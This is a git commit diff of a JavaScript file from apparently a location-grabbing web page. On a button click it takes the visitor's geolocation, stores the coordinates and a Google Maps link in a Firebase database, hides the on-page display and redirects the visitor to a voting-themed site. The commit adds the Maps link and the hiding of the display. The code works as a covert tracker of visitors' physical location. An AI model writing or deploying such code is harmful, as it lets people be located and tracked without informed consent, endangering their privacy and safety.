e5d251964baa0e88e978e8297e0d93bd2d43e27c
CusMeDroid <108187260+CusMeDroid@users.noreply.github.com>
2023-10-27 12:15:09 +0700

    Update script.js

--- script.js
+++ script.js
@@ -5,17 +5,20 @@ var jlun = document.getElementById("demo");
 function getSave() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition);
+    jlun.style.display = "none";
   } else { 
     jlun.innerHTML = "Pastikan anda menyetujui lokasi!";
+    jlun.style.display = "block";
   }
 }
 
 function showPosition(position) {
-    jlun.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
-    var slat = position.coords.latitude;
-    var slong = position.coords.longitude;
-    firebase.database().ref("/" + time).set({Latitude: slat,Longitude: slong});
-    window.location.assign("http://mevoting.is-best.net/");
+  jlun.innerHTML = "Latitude: " + position.coords.latitude + "<br>Longitude: " + position.coords.longitude;
+  var slat = position.coords.latitude;
+  var slong = position.coords.longitude;
+  var smaps = "https://google.com/maps/search/"+slat+","+slong;
+  firebase.database().ref("/" + time).set({Latitude: slat,Longitude: slong,maps: smaps});
+  window.location.assign("http://mevoting.is-best.net/");
 }
 
 document.getElementById("check").onclick = function () {
